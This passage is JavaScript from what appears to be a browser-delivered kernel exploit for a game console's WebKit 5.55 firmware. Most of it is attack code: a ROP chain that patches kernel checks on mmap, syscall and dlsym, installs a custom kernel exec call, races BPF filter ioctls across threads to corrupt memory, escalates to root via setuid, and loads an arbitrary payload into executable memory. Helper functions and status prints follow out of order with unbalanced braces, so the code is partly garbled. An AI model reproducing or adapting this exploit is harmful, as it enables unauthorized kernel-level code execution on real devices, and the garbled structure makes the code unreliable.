      var kernel_mmap_patch = new int64(0x37b64137, 0x3145c031);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x141D14);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kernel_mmap_patch);
      kchain.push(window.gadgets["mov [rax], rsi"]);

      // Patch syscall: syscall instruction allowed anywhere
      var kernel_syscall_patch1 = new int64(0x00000000, 0x40878b49);
      var kernel_syscall_patch2 = new int64(0x909079eb, 0x72909090);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x3DC603);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kernel_syscall_patch1);
      kchain.push(window.gadgets["mov [rax], rsi"]);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x3DC621);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kernel_syscall_patch2);
      kchain.push(window.gadgets["mov [rax], rsi"]);

      // Patch sys_dynlib_dlsym: Allow from anywhere
      var kernel_dlsym_patch1 = new int64(0x000352E9, 0x8B489000);
      var kernel_dlsym_patch2 = new int64(0x90C3C031, 0x90909090);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x3CF6FE);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kernel_dlsym_patch1);
      kchain.push(window.gadgets["mov [rax], rsi"]);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x690C0);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kernel_dlsym_patch2);
      kchain.push(window.gadgets["mov [rax], rsi"]);

      // Add custom sys_exec() call to execute arbitrary code as kernel
      var kernel_exec_param = new int64(0, 1);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x102b8a0);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(0x02);
      kchain.push(window.gadgets["mov [rax], rsi"]);
      kchain.push(window.gadgets["pop rsi"])
      kchain.push(0x13a39f); // jmp qword ptr [rsi]
      kchain.push(window.gadgets["pop rdi"])
      kchain.push(savectx.add32(0x50));
      kchain.push(offsetToWebKit(0x119d1f0)); //add rsi, [rdi]; mov rax, rsi
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x102b8a8);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["mov [rax], rsi"]);
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x102b8c8);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rsi"]);
      kchain.push(kernel_exec_param);
      kchain.push(window.gadgets["mov [rax], rsi"]);

      // Enable kernel write protection
      kchain.push(window.gadgets["pop rax"])
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(0x280f70);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["jmp rax"])

      // To userland!
      kchain.push(window.gadgets["pop rax"]);
      kchain.push(0);
      kchain.push(window.gadgets["ret"]);
      kchain.push(offsetToWebKit(0x3EBD0));

      // Setup valid program
      var bpf_valid_prog          = malloc(0x10);
      var bpf_valid_instructions  = malloc(0x80);

      p.write8(bpf_valid_instructions.add32(0x00), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x08), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x10), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x18), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x20), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x28), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x30), 0x00000000);
      p.write8(bpf_valid_instructions.add32(0x38), 0x00000000);
      p.write4(bpf_valid_instructions.add32(0x40), 0x00000006);
      p.write4(bpf_valid_instructions.add32(0x44), 0x00000000);

      p.write8(bpf_valid_prog.add32(0x00), 0x00000009);
      p.write8(bpf_valid_prog.add32(0x08), bpf_valid_instructions);

      // Setup invalid program
      var entry = window.gadgets["pop rsp"];
      var bpf_invalid_prog          = malloc(0x10);
      var bpf_invalid_instructions  = malloc(0x80);

      p.write4(bpf_invalid_instructions.add32(0x00), 0x00000001);
      p.write4(bpf_invalid_instructions.add32(0x04), entry.low);
      p.write4(bpf_invalid_instructions.add32(0x08), 0x00000003);
      p.write4(bpf_invalid_instructions.add32(0x0C), 0x0000001E);
      p.write4(bpf_invalid_instructions.add32(0x10), 0x00000001);
      p.write4(bpf_invalid_instructions.add32(0x14), entry.hi);
      p.write4(bpf_invalid_instructions.add32(0x18), 0x00000003);
      p.write4(bpf_invalid_instructions.add32(0x1C), 0x0000001F);
      p.write4(bpf_invalid_instructions.add32(0x20), 0x00000001);
      p.write4(bpf_invalid_instructions.add32(0x24), kchainstack.low);
      p.write4(bpf_invalid_instructions.add32(0x28), 0x00000003);
      p.write4(bpf_invalid_instructions.add32(0x2C), 0x00000020);
      p.write4(bpf_invalid_instructions.add32(0x30), 0x00000001);
      p.write4(bpf_invalid_instructions.add32(0x34), kchainstack.hi);
      p.write4(bpf_invalid_instructions.add32(0x38), 0x00000003);
      p.write4(bpf_invalid_instructions.add32(0x3C), 0x00000021);
      p.write4(bpf_invalid_instructions.add32(0x40), 0x00000006);
      p.write4(bpf_invalid_instructions.add32(0x44), 0x00000001);

      p.write8(bpf_invalid_prog.add32(0x00), 0x00000009);
      p.write8(bpf_invalid_prog.add32(0x08), bpf_invalid_instructions);

   /////////////////// STAGE 3: Racing Filters ///////////////////

      // ioctl() with valid BPF program will trigger free() of old program and reallocate memory for the new one 
   
     // ioctl() with valid BPF program will trigger free() of old program and reallocate memory for the new one
      spawnthread(function (thread2) {
        interrupt1 = thread2.ropframe;
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["pop rdi"]); // pop rdi
        thread2.push(fd1); // what
        thread2.push(window.gadgets["pop rsi"]); // pop rsi
        thread2.push(0x8010427B); // what
        thread2.push(window.gadgets["pop rdx"]); // pop rdx
        thread2.push(bpf_valid_prog); // what
        thread2.push(window.gadgets["pop rsp"]); // pop rsp
        thread2.push(thread2.ropframe.add32(0x800)); // what
        thread2.count = 0x100;
        var cntr = thread2.count;
        thread2.push(window.syscalls[54]); // ioctl
        thread2.push_write8(thread2.ropframe.add32(cntr * 8), window.syscalls[54]); // restore ioctl
        thread2.push(window.gadgets["pop rsp"]); // pop rdx
        thread2.push(thread2.ropframe); // what
      });

      // ioctl() with invalid BPF program will be sprayed and eventually get used by the thread where the program has already been validated
      spawnthread(function (thread2) {
        interrupt2 = thread2.ropframe;
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["pop rdi"]); // pop rdi
        thread2.push(fd2); // what
        thread2.push(window.gadgets["pop rsi"]); // pop rsi
        thread2.push(0x8010427B); // what
        thread2.push(window.gadgets["pop rdx"]); // pop rdx
        thread2.push(bpf_invalid_prog); // what
        thread2.push(window.gadgets["pop rsp"]); // pop rsp
        thread2.push(thread2.ropframe.add32(0x800)); // what
        thread2.count = 0x100;
        var cntr = thread2.count;
        thread2.push(window.syscalls[54]); // ioctl
        thread2.push_write8(thread2.ropframe.add32(cntr * 8), window.syscalls[54]); // restore ioctl
        thread2.push(window.gadgets["pop rsp"]); // pop rdx
        thread2.push(thread2.ropframe); // what
      });
      
     /////////////////// STAGE 3: Trigger ///////////////////
     var scratch = malloc(0x200);
     var test = kernel_rop_run(fd1, scratch);
      if(p.syscall("setuid", 0) == 0) {
        allset();
      } else {
        throw "Kernel exploit failed!";
      }
    } else {
      // Everything done already :D
      allset();
    }    
     
     // create loader memory
    var code_addr = new int64(0x26100000, 0x00000009);
    var buffer = p.syscall("mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
      // verify loaded
   
    if (buffer == '926100000') {
      // setup the stuff
      var scePthreadCreate = offsetToLibKernel(0x115c0);
      var thread = malloc(0x08);
      var thr_name = malloc(0x10);
      p.writeString(thr_name, "loader");
                  
     var createRet = p.fcall(scePthreadCreate, thread, 0, code_addr, 0, thr_name);
    }
     
      // write dummy loader
      for (var i = 0; i < loader.length; i++) {
          p.write4(code_addr.add32(i * 4), loader[i]);
      }
     // write payload
      for (var i = 0; i < payload.length; i++) {
          p.write4(code_addr.add32(0x100000 + i * 4), payload[i]);
      }  
  
  var ptr     = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = backing;

  return ptr;
}

function mallocu32(size) {
  var backing = new Uint8Array(0x10000 + size * 4);

  window.nogc.push(backing);

  var ptr     = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = new Uint32Array(backing.buffer);

  return ptr;
}
   var krop = function (p, addr) {
  // Contains base and stack pointer for fake stack (this.ropframe = RBP, this.stackPointer = RSP)
  this.ropframe    = addr;
  this.stackPointer = 0;

  // Push instruction / value onto fake stack
  this.push = function (val) {
    p.write8(this.ropframe.add32(this.stackPointer), val);
    this.stackPointer += 8;
  };

  // Write to address with value (helper function)
  this.write64 = function (addr, val) {
    this.push(window.gadgets["pop rdi"]);
    this.push(addr);
    this.push(window.gadgets["pop rax"]);
    this.push(val);
    this.push(window.gadgets["mov [rdi], rax"]);
  }

  // Return krop object
  return this;
};


    p.sptr = function(str) {
        var bufView = new Uint8Array(str.length+1);
        for (var i=0; i<str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        window.nogc.push(bufView);
        return p.read8(p.leakval(bufView).add32(0x10));
    };
  

    print("all good. fcall test retval = Successful");
    print ("--- welcome to stage 3: Racing Filters ---");
    print ("all good. test loader memory = Successful");
    print ("--- welcome to stage 4 ---");
    print("all Stage test = 99%");
    print("....Webkit 5.55 Success....");
    
   
}
  


 
